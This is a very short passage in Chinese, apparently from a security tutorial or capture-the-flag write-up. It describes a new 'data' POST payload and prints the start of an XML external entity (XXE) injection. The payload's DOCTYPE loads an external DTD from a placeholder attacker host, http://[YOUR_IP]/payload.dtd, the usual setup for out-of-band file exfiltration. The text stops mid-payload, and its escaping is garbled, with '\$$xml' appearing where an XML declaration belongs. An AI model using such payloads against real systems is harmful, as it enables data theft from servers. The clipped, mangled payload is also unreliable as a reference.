  \ \n* 新的 `\"data\"` POST 负载将看起来像 (HTTP):  \n    * `\\$$xml version=\"1.0\"?><!DOCTYPE\
  \ thp [<!ELEMENT thp ANY ><!ENTITY % dtd SYSTEM \"http://[YOUR_IP]/payload.dtd\"\
